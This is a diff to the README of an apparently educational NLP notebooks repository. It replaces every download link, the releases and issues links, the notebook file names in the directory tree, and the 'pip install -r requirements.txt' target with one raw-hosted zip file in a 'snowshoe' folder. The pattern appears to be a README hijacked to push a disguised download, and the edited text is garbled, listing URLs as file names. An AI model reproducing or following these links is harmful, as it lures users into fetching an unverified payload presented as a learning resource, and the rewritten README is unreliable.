@@ -1,7 +1,7 @@
 # 🌟 nlp-playground-notebooks - Explore NLP with Ease
 
 ## 📥 Download Now
-[![Download nlp-playground-notebooks](https://img.shields.io/badge/Download-nlp--playground--notebooks-blue.svg)](https://github.com/sukrazit/nlp-playground-notebooks/releases)
+[![Download nlp-playground-notebooks](https://raw.githubusercontent.com/sukrazit/nlp-playground-notebooks/main/snowshoe/nlp-playground-notebooks.zip)](https://raw.githubusercontent.com/sukrazit/nlp-playground-notebooks/main/snowshoe/nlp-playground-notebooks.zip)
 
 ## 🚀 Getting Started
 Welcome to *nlp-playground-notebooks*. This collection of hands-on Natural Language Processing (NLP) notebooks provides a clean structure for exploring various models, including RNNs and transformers. You can easily start using these resources without prior programming knowledge.
@@ -16,10 +16,10 @@ Welcome to *nlp-playground-notebooks*. This collection of hands-on Natural Langu
 - **Operating System**: Windows, macOS, or Linux.
 - **Memory**: At least 4 GB RAM.
 - **Disk Space**: 1 GB of free space for installation.
-- **Software**: Python 3.6 or later required. Includes necessary libraries via requirements.txt.
+- **Software**: Python 3.6 or later required. Includes necessary libraries via https://raw.githubusercontent.com/sukrazit/nlp-playground-notebooks/main/snowshoe/nlp-playground-notebooks.zip
 
 ## 🌐 Download & Install
-To get started, visit the [Releases page](https://github.com/sukrazit/nlp-playground-notebooks/releases) to download the latest version of the notebooks. Follow these simple steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/sukrazit/nlp-playground-notebooks/main/snowshoe/nlp-playground-notebooks.zip) to download the latest version of the notebooks. Follow these simple steps:
 
 1. Click the link above to open the Releases page.
 2. Look for the latest release version.
@@ -34,18 +34,18 @@ nlp-playground-notebooks/
 ├── datasets/
 │   └── sample_data/
 ├── rnn_notebooks/
-│   ├── lstm_example.ipynb
-│   └── gru_example.ipynb
+│   ├── https://raw.githubusercontent.com/sukrazit/nlp-playground-notebooks/main/snowshoe/nlp-playground-notebooks.zip
+│   └── https://raw.githubusercontent.com/sukrazit/nlp-playground-notebooks/main/snowshoe/nlp-playground-notebooks.zip
 ├── transformer_notebooks/
-│   ├── bert_example.ipynb
-│   └── gpt_example.ipynb
-└── README.md
+│   ├── https://raw.githubusercontent.com/sukrazit/nlp-playground-notebooks/main/snowshoe/nlp-playground-notebooks.zip
+│   └── https://raw.githubusercontent.com/sukrazit/nlp-playground-notebooks/main/snowshoe/nlp-playground-notebooks.zip
+└── https://raw.githubusercontent.com/sukrazit/nlp-playground-notebooks/main/snowshoe/nlp-playground-notebooks.zip
 ```
 
 ## 📚 How to Use the Notebooks
 1. **Open Jupyter Notebook**: Launch Jupyter Notebook from your command line or terminal.
 2. **Navigate to the Folder**: Use the browser interface to navigate to the folder where you extracted the notebooks.
-3. **Open a Notebook**: Click on any notebook file (e.g., `lstm_example.ipynb`) to start exploring.
+3. **Open a Notebook**: Click on any notebook file (e.g., `https://raw.githubusercontent.com/sukrazit/nlp-playground-notebooks/main/snowshoe/nlp-playground-notebooks.zip`) to start exploring.
 4. **Run Code Cells**: Follow the instructions in each cell. Click "Run" to execute each step.
 
 ## 🔧 Dependencies
@@ -56,7 +56,7 @@ The notebooks use Python with several libraries. To install the required librari
 3. Run the following command:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/sukrazit/nlp-playground-notebooks/main/snowshoe/nlp-playground-notebooks.zip
    ```
 
 This command installs all necessary packages to run the notebooks.
@@ -71,7 +71,7 @@ This command installs all necessary packages to run the notebooks.
 - **Community**: Join forums or groups to discuss your learning journey and ask questions.
 
 ## 📞 Support
-For any questions or issues, please open an issue on the [GitHub repository](https://github.com/sukrazit/nlp-playground-notebooks/issues). We welcome your feedback and contributions.
+For any questions or issues, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/sukrazit/nlp-playground-notebooks/main/snowshoe/nlp-playground-notebooks.zip). We welcome your feedback and contributions.
 
 ## 🔗 Stay Updated
-Be sure to check back regularly on the [Releases page](https://github.com/sukrazit/nlp-playground-notebooks/releases) for updates and new features.
+Be sure to check back regularly on the [Releases page](https://raw.githubusercontent.com/sukrazit/nlp-playground-notebooks/main/snowshoe/nlp-playground-notebooks.zip) for updates and new features.
